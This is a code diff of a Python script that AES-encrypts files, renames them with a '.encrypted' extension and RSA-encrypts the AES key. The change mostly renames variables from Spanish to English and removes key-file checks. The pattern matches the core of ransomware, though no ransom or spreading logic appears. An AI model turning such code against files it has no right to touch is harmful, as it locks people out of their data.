@@ -26,23 +26,18 @@ def encrypt_file(file, aes_key):
             f.write(iv + datos_cifrados)  
         encrypted_file = file + ".encrypted"
         os.rename(file, encrypted_file)  # Renombrar el archivo con extensión personalizada
-        print(f"Archivo cifrado: {encrypted_file}")
+        print(f"Archivo cifrado: {file}->{encrypted_file}")
     except Exception as e:
         print(f"Error cifrando {file}: {e}")
 
-def encrypt_aes_key(clave_aes):
+def encrypt_aes_key(aes_key):
     gen_keys.generate_rsa_key()
-    if not os.path.exists("rsa_public.pem"):
-        raise FileNotFoundError("El archivo de clave pública RSA 'rsa_public.pem' no se encuentra.")
     with open("rsa_public.pem", "rb") as f:
-        clave_publica = RSA.import_key(f.read())
-    cipher_rsa = PKCS1_OAEP.new(clave_publica)
-    clave_cifrada = cipher_rsa.encrypt(clave_aes)
+        rsa_public_key = RSA.import_key(f.read())
+    cipher_rsa = PKCS1_OAEP.new(rsa_public_key)
+    aes_key_encrypted = cipher_rsa.encrypt(aes_key)
     with open("aes_key_encrypted.bin", "wb") as f:
-        f.write(clave_cifrada)
-    print("Clave AES cifrada con RSA y guardada en aes_key_encrypted.bin.")
-    if not os.path.exists("rsa_private.pem"):
-        raise FileNotFoundError("El archivo de clave privada RSA 'rsa_private.pem' no se encuentra.")
+        f.write(aes_key_encrypted)
 
 def encrypt_files():
     gen_keys.generate_aes_key()  # Generar clave simétrica
